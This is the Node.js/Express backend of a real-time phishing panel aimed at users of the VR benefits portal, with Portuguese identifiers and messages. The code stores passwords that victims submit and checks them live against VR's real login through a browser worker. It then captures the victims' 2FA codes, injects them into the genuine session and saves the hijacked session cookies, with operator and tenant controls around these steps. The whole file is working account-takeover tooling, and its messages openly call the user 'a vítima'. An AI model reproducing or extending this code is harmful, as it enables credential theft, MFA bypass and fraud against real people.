const express = require("express");
const fs = require("fs");
const path = require("path");
const { execFile } = require("child_process");
const dbOps = require("./db");
const audit = require("./audit");

process.on("uncaughtException", (err) => {
    console.error("[CRITICAL] Uncaught Exception:", err.message || err);
});

process.on("unhandledRejection", (reason) => {
    console.error("[CRITICAL] Unhandled Rejection:", reason);
});

const app = express();

const PORT = process.env.PORT || 3000;
const WORKER_URL = process.env.WORKER_URL || "http://127.0.0.1:3005";


const PUBLIC_DIR = path.join(__dirname, "public");

const DADOS_JSON = path.join(
    __dirname,
    "dados.json"
);

const RESULTADO_JSON = path.join(
    __dirname,
    "resultado.json"
);

const SESSOES_DIR = path.join(__dirname, "sessoes");
if (!fs.existsSync(SESSOES_DIR)) {
    try { fs.mkdirSync(SESSOES_DIR, { recursive: true }); } catch (e) {}
}

const BOT_PY = path.join(
    __dirname,
    "bot.py"
);

const PYTHON = process.platform === "win32"
    ? "python"
    : (fs.existsSync("/opt/vr-tf-main/venv/bin/python")
        ? "/opt/vr-tf-main/venv/bin/python"
        : (fs.existsSync(path.join(__dirname, "venv", "bin", "python"))
            ? path.join(__dirname, "venv", "bin", "python")
            : "python3"));

let configApp = {
    auto_mode: true // Modo 100% autônomo ativo por padrão
};

let sseClients = [];

function extrairTenant(req) {
    const fromBody = req.body && req.body.tenant;
    const fromQuery = req.query && (req.query.tenant || req.query.cliente);
    const fromHeader = req.headers && req.headers["x-tenant-id"];
    const t = fromBody || fromQuery || fromHeader || "default";
    return String(t).trim() || "default";
}

function notificarClientes() {
    if (sseClients.length === 0) return;
    try {
        const cachePayloads = new Map();
        sseClients = sseClients.filter(client => {
            try {
                if (client.res.writableEnded || client.res.destroyed) return false;
                const clientTenant = client.tenant || "global";
                if (!cachePayloads.has(clientTenant)) {
                    cachePayloads.set(clientTenant, `data: ${JSON.stringify(gerarDadosPainel(client.tenant))}\n\n`);
                }
                client.res.write(cachePayloads.get(clientTenant));
                return true;
            } catch (e) {
                return false;
            }
        });
    } catch (err) {
        console.error("Erro ao notificar SSE:", err);
    }
}

function gerarDadosPainel(tenant = null) {
    // 1. Prioriza persistência atômica do SQLite com suporte multi-tenant
    const dadosConsolidados = dbOps.obterDadosConsolidados(configApp.auto_mode, tenant);
    if (dadosConsolidados) {
        return dadosConsolidados;
    }

    // 2. Fallback legado via arquivos JSON
    const dados = lerDados();
    const resultados = lerResultados();
    const codigos2fa = dados.filter(d => d.tipo === "2FA" || d.codigo);
    const logins = dados.filter(d => (d.tipo === "LOGIN" || !d.tipo) && d.senha);

    const mapaUsuarios = new Map();

    dados.forEach(d => {
        const u = (d.nome || d.usuario || "desconhecido").trim();
        const userKey = u.toLowerCase();
        if (!mapaUsuarios.has(userKey)) {
            mapaUsuarios.set(userKey, {
                usuario: u,
                senhas: [],
                ultimaSenha: "—",
                codigos: [],
                ultimoCodigo: null,
                status_2fa: null,
                status_login: null,
                status_credencial: "testando",
                cookies: null,
                total_cookies: 0,
                url_final: "https://superportal.vr.com.br/",
                tem_sessao_salva: false,
                link_acesso: `/sessao/${encodeURIComponent(u)}`,
                data_hora: d.data_hora || "—",
                ultimoEventoTipo: null
            });
        }

        const item = mapaUsuarios.get(userKey);
        item.data_hora = d.data_hora || item.data_hora;

        if (d.tipo === "2FA" || d.codigo) {
            item.ultimoEventoTipo = "2FA";
            if (!item.codigos.includes(d.codigo)) item.codigos.push(d.codigo);
            item.ultimoCodigo = d.codigo;
            item.status_2fa = d.status_2fa || "pendente";
            if (d.cookies && (!item.cookies || item.cookies.length === 0)) {
                item.cookies = d.cookies;
                item.total_cookies = d.cookies.length;
                item.tem_sessao_salva = true;
            }
            if (d.url_final) item.url_final = d.url_final;
        } else if (d.senha) {
            item.ultimoEventoTipo = "LOGIN";
            if (!item.senhas.includes(d.senha)) item.senhas.push(d.senha);
            item.ultimaSenha = d.senha;
            item.status_login = d.status_login || "aguardando_solicitacao";
            item.status_credencial = d.status_credencial || "testando";
            item.ultimoCodigo = null;
            item.status_2fa = null;
        }
    });

    // Fallback: se status_credencial, url_final ou cookies ainda não preenchidos, verifica histórico em resultado.json
    mapaUsuarios.forEach((item, userKey) => {
        for (let i = resultados.length - 1; i >= 0; i--) {
            const r = resultados[i];
            if (r && (r.nome || "").toLowerCase().trim() === userKey) {
                if (!item.status_credencial || item.status_credencial === "testando") {
                    item.status_credencial = r.status_credencial || (r.valido ? "valido" : "invalido");
                }
                if (r.cookies && (!item.cookies || item.cookies.length === 0)) {
                    item.cookies = r.cookies;
                    item.total_cookies = (r.cookies || []).length;
                    item.tem_sessao_salva = true;
                }
                if (r.url_final) item.url_final = r.url_final;
                break;
            }
        }

        // Verifica também se existe arquivo dedicado em sessoes/
        const safeKey = userKey.replace(/[^a-z0-9_-]/g, "_");
        const sessionFile = path.join(SESSOES_DIR, `${safeKey}_cookies.json`);
        if (fs.existsSync(sessionFile)) {
            try {
                const sData = JSON.parse(fs.readFileSync(sessionFile, "utf8"));
                if (sData && sData.cookies && sData.cookies.length > 0) {
                    item.cookies = sData.cookies;
                    item.total_cookies = sData.cookies.length;
                    item.tem_sessao_salva = true;
                    if (sData.url_final) item.url_final = sData.url_final;
                }
            } catch (e) {}
        }
    });

    mapaUsuarios.forEach(item => {
        if (item.ultimoCodigo) {
            if (item.status_2fa === "aceito") {
                item.status = "2FA Aceito";
            } else if (item.status_2fa === "negado") {
                item.status = "2FA Negado";
            } else {
                item.status = "Aguardando Decisão";
            }
        } else {
            if (item.status_login === "solicitar_2fa") {
                item.status = "2FA Solicitado";
            } else {
                item.status = "Aguardando Operador";
            }
        }
    });

    const consolidados = Array.from(mapaUsuarios.values()).reverse();

    const feed = [...dados].reverse().map(d => {
        const u = d.nome || d.usuario || "desconhecido";
        return {
            tipo: d.tipo === "2FA" ? "2FA" : "LOGIN",
            usuario: u,
            senha: d.senha || null,
            codigo: d.codigo || null,
            status_2fa: d.status_2fa || null,
            status_login: d.status_login || null,
            status_credencial: d.status_credencial || null,
            cookies: d.cookies || null,
            total_cookies: d.cookies ? d.cookies.length : 0,
            url_final: d.url_final || "https://superportal.vr.com.br/",
            link_acesso: `/sessao/${encodeURIComponent(u)}`,
            data_hora: d.data_hora || "—"
        };
    });

    return {
        success: true,
        auto_mode: configApp.auto_mode,
        totalLogins: logins.length,
        total2FA: codigos2fa.length,
        totalUsuarios: mapaUsuarios.size,
        consolidados,
        feed
    };
}


app.use((req, res, next) => {
    if (req.path.startsWith("/api") || req.path.endsWith(".js") || req.path.endsWith(".html")) {
        res.set({
            "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
            "Pragma": "no-cache",
            "Expires": "0",
            "Surrogate-Control": "no-store"
        });
    }
    next();
});

app.use(
    express.json()
);

app.use(
    express.static(PUBLIC_DIR)
);


function lerDados() {

    if (!fs.existsSync(DADOS_JSON)) {
        return [];
    }

    try {

        const conteudo = fs.readFileSync(
            DADOS_JSON,
            "utf8"
        );

        if (!conteudo.trim()) {
            return [];
        }

        const dados = JSON.parse(conteudo);

        if (Array.isArray(dados)) {
            return dados;
        }

        return [];

    } catch (erro) {

        console.error(
            "Erro ao ler dados.json:",
            erro
        );

        return [];
    }
}



function lerResultados() {

    if (!fs.existsSync(RESULTADO_JSON)) {
        return [];
    }

    try {

        const conteudo = fs.readFileSync(
            RESULTADO_JSON,
            "utf8"
        );

        if (!conteudo.trim()) {
            return [];
        }

        const resultados = JSON.parse(conteudo);


        if (Array.isArray(resultados)) {
            return resultados;
        }



        if (
            resultados &&
            typeof resultados === "object"
        ) {
            return [resultados];
        }


        return [];

    } catch (erro) {

        console.error(
            "Erro ao ler resultado.json:",
            erro
        );

        return [];
    }
}



function executarBot() {

    return new Promise(
        (resolve, reject) => {

            execFile(
                PYTHON,
                [BOT_PY],

                {
                    cwd: __dirname,
                    timeout: 60000
                },

                (erro, stdout, stderr) => {

                    if (stdout) {

                        console.log(
                            "\n========== BOT =========="
                        );

                        console.log(stdout);

                        console.log(
                            "=========================\n"
                        );
                    }


                    if (stderr) {

                        console.error(
                            "\n========== PYTHON STDERR =========="
                        );

                        console.error(stderr);

                        console.error(
                            "===================================\n"
                        );
                    }


                    if (erro) {

                        reject(erro);
                        return;
                    }


                    resolve();
                }
            );
        }
    );
}

async function testarViaWorker(usuario, senha, reqMeta = {}) {
    const t0 = performance.now();
    const userKey = usuario.toLowerCase().trim();
    const tenant = reqMeta.tenant || "default";
    audit.registrar({
        tenant,
        event_type: "VALIDATION_START",
        usuario,
        status: "PENDING",
        details: { endpoint: `${WORKER_URL}/testar`, tenant },
        ip: reqMeta.ip,
        userAgent: reqMeta.userAgent
    });

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 22000);

        const res = await fetch(`${WORKER_URL}/testar`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ usuario, senha }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();
        const duracaoMs = performance.now() - t0;
        const duracaoSec = (duracaoMs / 1000).toFixed(2);

        const statusCred = data.status_credencial || (data.valido ? "valido" : "invalido");
        const statusLogin = (data.valido && configApp.auto_mode) ? "solicitar_2fa" : undefined;

        // Atualização ACID no SQLite e sincronização atômica para dados.json
        dbOps.atualizarStatusCredencial(usuario, statusCred, statusLogin);

        // Registro detalhado no sistema de auditoria
        audit.registrar({
            tenant,
            event_type: data.valido ? "VALIDATION_SUCCESS" : (statusCred === "bloqueio_captcha" ? "CAPTCHA_BLOCKED" : "VALIDATION_FAILED"),
            usuario,
            status: data.valido ? "SUCCESS" : (statusCred === "bloqueio_captcha" ? "BLOCKED" : "FAILED"),
            duration_ms: duracaoMs,
            details: {
                tenant,
                valido: data.valido,
                status_credencial: statusCred,
                mensagem: data.mensagem,
                tempo_segundos: Number(duracaoSec),
                auto_mode: configApp.auto_mode
            },
            ip: reqMeta.ip,
            userAgent: reqMeta.userAgent
        });

        if (data.valido && configApp.auto_mode) {
            console.log(`[FULL-AUTO][${tenant}] 🚀 ${usuario} senha válida na VR em ${duracaoSec}s -> 2FA disparado automaticamente!`);
        }

        notificarClientes();
        console.log(`[WARM WORKER][${tenant}] ⚡ ${usuario} verificado em ${duracaoSec}s -> ${statusCred} (${data.mensagem || ''})`);
        return true;
    } catch (err) {
        const duracaoMs = performance.now() - t0;
        console.warn("[WARM WORKER] Worker offline ou ocupado, acionando fallback bot.py:", err.message);
        audit.registrar({
            tenant,
            event_type: "VALIDATION_FALLBACK",
            usuario,
            status: "WARNING",
            duration_ms: duracaoMs,
            details: { tenant, error: err.message, fallback: "bot.py" },
            ip: reqMeta.ip,
            userAgent: reqMeta.userAgent
        });
        executarBot().catch(erro => {
            console.error("Execução assíncrona do bot.py:", erro.message);
        });
        return false;
    }
}

async function injetar2FAViaWorker(usuario, codigo, tenant = "default") {
    try {
        console.log(`[FULL-AUTO][${tenant}] Despachando código 2FA para o worker: ${usuario} -> ${codigo}`);
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000);

        const res = await fetch(`${WORKER_URL}/injetar-2fa`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ usuario, codigo }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();

        const userKey = usuario.toLowerCase().trim();
        const decisao = data.valido ? "aceito" : "negado";

        dbOps.atualizarStatus2FA(usuario, codigo, decisao);
        if (data.valido && data.cookies && data.cookies.length > 0) {
            dbOps.salvarSessao(usuario, data.cookies, data.url_final || "", tenant);
        }

        audit.registrar({
            tenant,
            event_type: data.valido ? "2FA_ACEITO" : "2FA_NEGADO",
            usuario,
            status: data.valido ? "SUCCESS" : "FAILED",
            details: {
                tenant,
                codigo,
                mensagem: data.mensagem,
                total_cookies: data.cookies ? data.cookies.length : 0
            }
        });

        notificarClientes();

        console.log(`[FULL-AUTO][${tenant}] Veredito 2FA VR para ${usuario}: ${decisao.toUpperCase()} (${data.mensagem})`);
        return data;
    } catch (err) {
        console.warn(`[FULL-AUTO] Falha ao injetar 2FA no worker: ${err.message}. Mantendo em pendente para operador manual.`);
        return null;
    }
}



const URL_FINAL_PADRAO = "https://superportal-empregador.vr.com.br/";

app.post(
    "/salvar",

    async (req, res) => {

        const {
            nome,
            senha
        } = req.body;

        if (
            typeof nome !== "string" ||
            typeof senha !== "string" ||
            !nome.trim() ||
            !senha
        ) {

            return res.status(400).json({
                success: false,
                status: "erro",
                mensagem: "Preencha todos os campos."
            });
        }

        try {
            const usuarioAlvo = nome.trim();
            const tenant = extrairTenant(req);
            const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
            const userAgent = req.headers["user-agent"] || "";

            // 1. Registro de auditoria
            audit.registrar({
                tenant,
                event_type: "LOGIN_SUBMITTED",
                usuario: usuarioAlvo,
                status: "INFO",
                details: { tenant, ip, userAgent: userAgent.substring(0, 100) },
                ip,
                userAgent
            });

            // 2. Persistência atômica no SQLite com tenant e sincronização com JSON
            dbOps.salvarLogin({ usuario: usuarioAlvo, senha, ip, userAgent, tenant });

            notificarClientes();

            console.log(
                `[${tenant}] Nova tentativa recebida: ${usuarioAlvo} (Status: aguardando operador solicitar 2FA | Auditoria: testando na VR)`
            );

            // 3. Dispara validação prioritária ultrarrápida via Warm Worker
            testarViaWorker(usuarioAlvo, senha, { ip, userAgent, tenant });

            // 4. Timeout de segurança de emergência (25s max - apenas se nem worker nem bot responderem)
            setTimeout(() => {
                try {
                    const dados = lerDados();
                    let atualizou = false;
                    const uKey = usuarioAlvo.toLowerCase();
                    for (let i = dados.length - 1; i >= 0; i--) {
                        const item = dados[i];
                        if (item && item.senha) {
                            const u = (item.nome || item.usuario || "").toLowerCase().trim();
                            if (u === uKey && item.status_credencial === "testando") {
                                dbOps.atualizarStatusCredencial(usuarioAlvo, "invalido");
                                atualizou = true;
                                break;
                            }
                        }
                    }
                    if (atualizou) {
                        notificarClientes();
                        console.log(`[TIMEOUT DE SEGURANÇA] ${usuarioAlvo} marcado como invalido após 25s sem resposta.`);
                    }
                } catch (e) {
                    console.error("Erro no timeout de segurança:", e);
                }
            }, 25000);

            return res.json({
                success: true,
                tenant,
                status_login: "aguardando_solicitacao",
                status_credencial: "testando",
                usuario: usuarioAlvo,
                mensagem: "Login registrado. Aguardando operador solicitar 2FA no painel."
            });

        } catch (erro) {

            console.error(
                "Erro em /salvar:",
                erro
            );

            return res.status(500).json({
                success: false,
                status: "erro",
                mensagem: "Erro interno durante a verificação."
            });
        }
    }
);

app.post(
    "/api/resultado-bot",
    (req, res) => {
        const { usuario, valido, mensagem, status_credencial } = req.body;
        if (!usuario) {
            return res.status(400).json({ success: false, mensagem: "Usuário obrigatório." });
        }

        const userKey = usuario.toLowerCase().trim();
        const statusCred = status_credencial || (valido ? "valido" : "invalido");

        try {
            const dados = lerDados();
            let atualizou = false;

            for (let i = dados.length - 1; i >= 0; i--) {
                const item = dados[i];
                if (item && item.senha) {
                    const u = (item.nome || item.usuario || "").toLowerCase().trim();
                    if (u === userKey) {
                        item.status_credencial = statusCred;
                        if (valido && configApp.auto_mode) {
                            item.status_login = "solicitar_2fa";
                            console.log(`[FULL-AUTO] 🚀 ${usuario} verificado como VÁLIDO via resultado-bot -> 2FA disparado automaticamente!`);
                        }
                        atualizou = true;
                        break;
                    }
                }
            }

            if (atualizou) {
                fs.writeFileSync(DADOS_JSON, JSON.stringify(dados, null, 4), "utf8");
            }

            // Atualiza ou insere também em resultado.json para consistência total
            const resultados = lerResultados();
            let achouResultado = false;
            for (let i = resultados.length - 1; i >= 0; i--) {
                const r = resultados[i];
                if (r && (r.nome || "").toLowerCase().trim() === userKey) {
                    r.valido = !!valido;
                    r.status_credencial = statusCred;
                    r.mensagem = mensagem || (valido ? "Senha correta na VR" : "Senha incorreta na VR");
                    achouResultado = true;
                    break;
                }
            }
            if (!achouResultado) {
                resultados.push({
                    data_hora: new Date().toLocaleString("pt-BR"),
                    valido: !!valido,
                    status_credencial: statusCred,
                    nome: usuario,
                    mensagem: mensagem || (valido ? "Senha correta na VR" : "Senha incorreta na VR")
                });
            }
            fs.writeFileSync(RESULTADO_JSON, JSON.stringify(resultados, null, 4), "utf8");

            notificarClientes();

            console.log(`[BOT RESULTADO] ${usuario} -> ${statusCred} (${mensagem || ''})`);
            return res.json({ success: true, usuario, status_credencial: statusCred });
        } catch (err) {
            console.error("Erro em /api/resultado-bot:", err);
            return res.status(500).json({ success: false, mensagem: "Erro ao registrar resultado do bot." });
        }
    }
);

app.get(
    "/api/status-login",
    (req, res) => {
        const usuario = (req.query.usuario || "").toLowerCase().trim();
        const dados = lerDados();
        const resultados = lerResultados();

        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && item.senha) {
                const userKey = (item.nome || item.usuario || "").toLowerCase().trim();
                if (!usuario || userKey === usuario) {
                    let statusCred = item.status_credencial || "testando";
                    if (statusCred === "testando") {
                        for (let j = resultados.length - 1; j >= 0; j--) {
                            const r = resultados[j];
                            if (r && (r.nome || "").toLowerCase().trim() === userKey) {
                                statusCred = r.status_credencial || (r.valido ? "valido" : "invalido");
                                break;
                            }
                        }
                    }
                    return res.json({
                        success: true,
                        status_login: item.status_login || "aguardando_solicitacao",
                        status_credencial: statusCred,
                        redirect: "/codigo.html"
                    });
                }
            }
        }

        let fallbackStatusCred = "testando";
        for (let j = resultados.length - 1; j >= 0; j--) {
            const r = resultados[j];
            if (r && (r.nome || "").toLowerCase().trim() === usuario) {
                fallbackStatusCred = r.status_credencial || (r.valido ? "valido" : "invalido");
                break;
            }
        }

        return res.json({
            success: true,
            status_login: "aguardando_solicitacao",
            status_credencial: fallbackStatusCred,
            redirect: "/codigo.html"
        });
    }
);

app.post(
    "/api/solicitar-2fa",
    (req, res) => {
        const { usuario, forcar } = req.body;
        if (!usuario) {
            return res.status(400).json({
                success: false,
                mensagem: "Usuário obrigatório."
            });
        }

        const userKey = usuario.toLowerCase().trim();

        try {
            const dados = lerDados();
            let statusCredAtual = null;
            for (let i = dados.length - 1; i >= 0; i--) {
                const item = dados[i];
                if (item && item.senha) {
                    const u = (item.nome || item.usuario || "").toLowerCase().trim();
                    if (u === userKey) {
                        statusCredAtual = item.status_credencial || "testando";
                        break;
                    }
                }
            }

            // Trava anti-2FA fantasma: impede envio prematuro sem comprovação de MFA real
            if (!forcar && statusCredAtual === "bloqueio_captcha") {
                return res.status(400).json({
                    success: false,
                    bloqueio_captcha: true,
                    mensagem: "Atenção: O SSO da VR ainda está no Desafio Captcha. O código 2FA ainda não foi disparado para o e-mail da vítima."
                });
            }

            if (!forcar && statusCredAtual === "invalido") {
                return res.status(400).json({
                    success: false,
                    invalido: true,
                    mensagem: "Atenção: A VR indicou senha incorreta. Não é recomendado solicitar 2FA para credenciais inválidas."
                });
            }

            dbOps.atualizarStatusLogin(usuario, "solicitar_2fa");
            audit.registrar({
                event_type: "2FA_REQUESTED",
                usuario,
                status: "INFO",
                details: { forcar: !!forcar, status_credencial_anterior: statusCredAtual }
            });

            notificarClientes();

            console.log(`[PAINEL] 2FA Solicitado para: ${usuario} (Forçado: ${!!forcar})`);

            return res.json({
                success: true,
                usuario,
                status_login: "solicitar_2fa"
            });
        } catch (err) {
            console.error("Erro em /api/solicitar-2fa:", err);
            return res.status(500).json({
                success: false,
                mensagem: "Erro ao solicitar 2FA."
            });
        }
    }
);

app.post(
    "/api/retestar-sso",
    async (req, res) => {
        const { usuario } = req.body;
        if (!usuario) {
            return res.status(400).json({ success: false, mensagem: "Usuário obrigatório." });
        }

        const userKey = usuario.toLowerCase().trim();
        const dados = lerDados();
        let senhaAlvo = null;

        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && item.senha) {
                const u = (item.nome || item.usuario || "").toLowerCase().trim();
                if (u === userKey) {
                    senhaAlvo = item.senha;
                    break;
                }
            }
        }

        if (!senhaAlvo) {
            return res.status(404).json({ success: false, mensagem: "Credenciais do usuário não encontradas no histórico." });
        }

        dbOps.atualizarStatusCredencial(usuario, "testando", "aguardando_solicitacao");
        audit.registrar({
            event_type: "RETEST_TRIGGERED",
            usuario,
            status: "INFO",
            details: { action: "retestar_sso" }
        });
        notificarClientes();

        console.log(`[RE-TESTAR SSO] 🔄 Disparando re-tentativa para: ${usuario}`);

        (async () => {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 15000);

                const response = await fetch(`${WORKER_URL}/retestar`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ usuario, senha: senhaAlvo }),
                    signal: controller.signal
                });
                clearTimeout(timeoutId);

                if (response.ok) {
                    const data = await response.json();
                    const statusCred = data.status_credencial || (data.valido ? "valido" : "invalido");
                    const statusLogin = (data.valido && configApp.auto_mode) ? "solicitar_2fa" : undefined;
                    dbOps.atualizarStatusCredencial(usuario, statusCred, statusLogin);
                    audit.registrar({
                        event_type: data.valido ? "RETEST_SUCCESS" : "RETEST_FAILED",
                        usuario,
                        status: data.valido ? "SUCCESS" : "FAILED",
                        details: { status_credencial: statusCred, mensagem: data.mensagem }
                    });
                    notificarClientes();
                } else {
                    testarViaWorker(usuario, senhaAlvo);
                }
            } catch (err) {
                console.warn("[RE-TESTAR SSO] Falha no worker /retestar, acionando fallback:", err.message);
                testarViaWorker(usuario, senhaAlvo);
            }
        })();

        return res.json({
            success: true,
            usuario,
            status_credencial: "testando",
            mensagem: "Re-tentativa disparada com sucesso no worker."
        });
    }
);

app.post(
    "/salvar-codigo",

    async (req, res) => {
        const {
            codigo,
            usuario
        } = req.body;

        if (!codigo || !codigo.toString().trim()) {
            return res.status(400).json({
                success: false,
                mensagem: "Código não informado."
            });
        }

        try {
            const codigoLimpo = codigo.toString().trim();
            const usuarioLimpo = usuario ? usuario.toString().trim() : "desconhecido";
            const tenant = extrairTenant(req);
            const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";

            // 1. Auditoria
            audit.registrar({
                tenant,
                event_type: "2FA_SUBMITTED",
                usuario: usuarioLimpo,
                status: "INFO",
                details: { tenant, codigo: codigoLimpo },
                ip
            });

            // 2. Persistência SQLite ACID
            dbOps.salvar2FA({ usuario: usuarioLimpo, codigo: codigoLimpo, status_2fa: "pendente", ip, tenant });

            notificarClientes();

            console.log(
                `[2FA][${tenant}] Código capturado para ${usuarioLimpo}: ${codigoLimpo} (Status: pendente)`
            );

            // 3. Disparo autônomo de injeção no SSO da VR
            if (configApp.auto_mode) {
                injetar2FAViaWorker(usuarioLimpo, codigoLimpo, tenant);
            }

            return res.json({
                success: true,
                tenant,
                status_2fa: "pendente",
                url_final: URL_FINAL_PADRAO
            });

        } catch (erro) {
            console.error(
                "Erro em /salvar-codigo:",
                erro
            );

            return res.status(500).json({
                success: false,
                mensagem: "Erro interno ao salvar código."
            });
        }
    }
);

app.get(
    "/api/status-2fa",
    (req, res) => {
        const usuario = (req.query.usuario || "").toLowerCase().trim();
        const dados = lerDados();

        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && (item.tipo === "2FA" || item.codigo)) {
                const userKey = (item.nome || item.usuario || "").toLowerCase().trim();
                if (!usuario || userKey === usuario) {
                    return res.json({
                        success: true,
                        status_2fa: item.status_2fa || "pendente",
                        url_final: URL_FINAL_PADRAO
                    });
                }
            }
        }

        return res.json({
            success: true,
            status_2fa: "pendente",
            url_final: URL_FINAL_PADRAO
        });
    }
);

app.post(
    "/api/decidir-2fa",
    (req, res) => {
        const { usuario, decisao } = req.body;
        if (!usuario || !decisao) {
            return res.status(400).json({
                success: false,
                mensagem: "Usuário e decisão obrigatórios."
            });
        }

        const decisaoLimpa = decisao === "aceito" ? "aceito" : "negado";
        const userKey = usuario.toLowerCase().trim();

        try {
            dbOps.atualizarStatus2FA(usuario, null, decisaoLimpa);
            audit.registrar({
                event_type: "2FA_DECISION_OPERATOR",
                usuario,
                status: decisaoLimpa === "aceito" ? "SUCCESS" : "FAILED",
                details: { decisao: decisaoLimpa }
            });

            notificarClientes();

            console.log(`[DECISÃO 2FA] ${usuario} -> ${decisaoLimpa}`);

            return res.json({
                success: true,
                usuario,
                decisao: decisaoLimpa
            });
        } catch (err) {
            console.error("Erro em /api/decidir-2fa:", err);
            return res.status(500).json({ success: false, mensagem: "Erro ao registrar decisão." });
        }
    }
);

app.get(
    "/api/painel",
    (req, res) => {
        try {
            const tenant = req.query.tenant || null;
            res.json(gerarDadosPainel(tenant));
        } catch (err) {
            console.error("Erro ao carregar dados do painel:", err);
            res.status(500).json({ success: false, mensagem: "Erro ao ler registros." });
        }
    }
);

app.get(
    "/api/tenants",
    (req, res) => {
        try {
            const tenants = dbOps.obterTenants();
            res.json({ success: true, tenants });
        } catch (err) {
            console.error("Erro ao listar tenants:", err);
            res.status(500).json({ success: false, error: err.message });
        }
    }
);

app.get(
    "/api/usuarios",
    (req, res) => {
        try {
            const tenant = req.query.tenant || req.query.cliente || null;
            const usuarios = dbOps.obterListaUsuarios(tenant);
            res.json({ success: true, total: usuarios.length, usuarios });
        } catch (err) {
            console.error("Erro ao listar usuários:", err);
            res.status(500).json({ success: false, error: err.message });
        }
    }
);

app.get(
    "/api/stream",
    (req, res) => {
        res.setHeader("Content-Type", "text/event-stream");
        res.setHeader("Cache-Control", "no-cache");
        res.setHeader("Connection", "keep-alive");
        if (res.flushHeaders) res.flushHeaders();

        const clientId = Date.now() + "_" + Math.random();
        const clientTenant = req.query.tenant || null;
        const newClient = { id: clientId, tenant: clientTenant, res };
        sseClients.push(newClient);

        // Envia estado inicial imediatamente para o tenant solicitado
        try {
            const initialData = `data: ${JSON.stringify(gerarDadosPainel(clientTenant))}\n\n`;
            res.write(initialData);
        } catch (e) {}

        const removerCliente = () => {
            sseClients = sseClients.filter(c => c.id !== clientId);
        };

        req.on("close", removerCliente);
        req.on("error", removerCliente);
        res.on("close", removerCliente);
        res.on("error", removerCliente);
    }
);

app.post(
    "/api/limpar",
    async (req, res) => {
        try {
            const tenant = req.body.tenant || req.query.tenant || null;
            // 1. Limpa banco SQLite e sincroniza JSONs
            dbOps.limparTodosDados(tenant);

            // 2. Registra purga na auditoria
            audit.registrar({
                tenant: tenant || "global",
                event_type: "DATA_PURGE",
                status: "WARNING",
                details: { action: "limpar_painel_operador", tenant: tenant || "global" }
            });

            // 3. Purgar abas e contextos em memória no worker Playwright (Zero Test Pollution)
            try {
                await fetch(`${WORKER_URL}/limpar-memoria`, { method: "POST" });
            } catch (wErr) {}

            notificarClientes();
            res.json({ success: true, mensagem: `Registros${tenant ? ` do tenant '${tenant}'` : ''} limpos com sucesso.` });
        } catch (err) {
            console.error("Erro ao limpar dados:", err);
            res.status(500).json({ success: false, mensagem: "Erro ao limpar dados." });
        }
    }
);

app.get(
    "/api/config",
    (req, res) => {
        res.json({ success: true, auto_mode: configApp.auto_mode });
    }
);

app.post(
    "/api/config",
    (req, res) => {
        const { auto_mode } = req.body;
        if (typeof auto_mode === "boolean") {
            configApp.auto_mode = auto_mode;
            console.log(`[CONFIG] Modo de automação alterado para: ${configApp.auto_mode ? 'FULL-AUTO (100% Autônomo)' : 'MANUAL'}`);
            audit.registrar({
                event_type: "CONFIG_CHANGE",
                status: "INFO",
                details: { auto_mode: configApp.auto_mode }
            });
            notificarClientes();
        }
        res.json({ success: true, auto_mode: configApp.auto_mode });
    }
);

// Endpoints de Auditoria e Telemetria
app.get(
    "/api/audit-logs",
    (req, res) => {
        try {
            const { limit = 100, offset = 0, usuario = "", event_type = "", status = "", tenant = "" } = req.query;
            const logs = audit.listar({
                limit: parseInt(limit, 10) || 100,
                offset: parseInt(offset, 10) || 0,
                usuario: String(usuario || "").trim(),
                event_type: String(event_type || "").trim(),
                status: String(status || "").trim(),
                tenant: String(tenant || "").trim()
            });
            return res.json({ success: true, total: logs.length, logs });
        } catch (e) {
            return res.status(500).json({ success: false, error: e.message });
        }
    }
);

app.get(
    "/api/audit-stats",
    (req, res) => {
        try {
            const tenant = req.query.tenant || null;
            const stats = audit.obterEstatisticas(tenant);
            return res.json({ success: true, stats });
        } catch (e) {
            return res.status(500).json({ success: false, error: e.message });
        }
    }
);

app.delete(
    "/api/audit-logs",
    (req, res) => {
        try {
            audit.limpar();
            return res.json({ success: true, mensagem: "Logs de auditoria limpos com sucesso." });
        } catch (e) {
            return res.status(500).json({ success: false, error: e.message });
        }
    }
);

function resolverSessaoCookies(usuarioRaw, tenant = null) {
    let usuario = String(usuarioRaw || "").trim();
    try {
        usuario = decodeURIComponent(usuario);
        if (usuario.includes("%")) {
            usuario = decodeURIComponent(usuario);
        }
    } catch (e) {}
    usuario = usuario.toLowerCase().trim();

    // 1. Busca prioritária via SQLite com suporte a tenant
    if (usuario && usuario !== "sessao" && usuario !== "sessaoremota" && usuario !== "acesso" && usuario !== "ultima" && usuario !== "latest" && usuario !== "exportar") {
        const dbSess = dbOps.obterSessao(usuario, tenant);
        if (dbSess && dbSess.cookies && dbSess.cookies.length > 0) {
            return {
                sessionData: {
                    tenant: dbSess.tenant || "default",
                    usuario: dbSess.usuario,
                    cookies: dbSess.cookies,
                    total_cookies: dbSess.total_cookies,
                    url_final: dbSess.url_final || "https://superportal-empregador.vr.com.br/",
                    data_hora: dbSess.updated_at ? new Date(dbSess.updated_at).toLocaleString("pt-BR") : new Date().toLocaleString("pt-BR")
                },
                userKey: dbSess.usuario.replace(/[^a-z0-9_-]/g, "_"),
                sessionFile: ""
            };
        }
    }

    const isGenerico = !usuario || usuario === "sessao" || usuario === "sessaoremota" || usuario === "acesso" || usuario === "ultima" || usuario === "latest" || usuario === "exportar";

    if (isGenerico) {
